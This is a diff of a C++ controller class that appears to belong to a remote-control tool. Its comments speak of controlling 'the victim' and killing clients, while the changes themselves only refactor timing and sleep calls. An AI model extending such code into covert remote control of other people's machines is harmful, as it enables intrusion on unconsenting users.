@@ -37,11 +37,11 @@ void Controller::controlWindow()
 
     while (isRunning) {
         //send signal to server to keep awake
-        if (Mlib::getTime() - lastAwakeSignal > 2'000) {
+        if (Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
             sf::Packet p;
             p << sf::Uint8('r');
             server.send(p);
-            lastAwakeSignal = Mlib::getTime();
+            lastAwakeSignal = Mlib::currentTime().asMil();
         }
 
         //open window - connect server - skip
@@ -63,7 +63,7 @@ void Controller::controlWindow()
             }
             //sleep for a bit and continue
             else {
-                Mlib::sleep(50);
+                Mlib::sleep(Mlib::milliseconds(50));
                 continue;
             }
         }
@@ -314,7 +314,7 @@ void Controller::takeCmdInput()
         }
         //start controlling the victim
         else if (cmd.substr(0, 7) == "control" && isPaired) {
-            Mlib::sleep(500);
+            Mlib::sleep(Mlib::milliseconds(500));
             isControlling = true, sendKeys = false, sendMouse = false, areSettingsOpen = false;
         }
         //kill a given client
@@ -433,7 +433,7 @@ init:
 void Controller::displayList()
 {
     system("CLS");
-    std::cout << "last update time: " << Mlib::getTime() / 1000 << " - id: " << id << "\n\n";
+    std::cout << "last update time: " << int(Mlib::currentTime().asSec()) << " - id: " << id << "\n\n";
 
     std::cout << "CONTROLLERS:\n";
     //output information for each controller
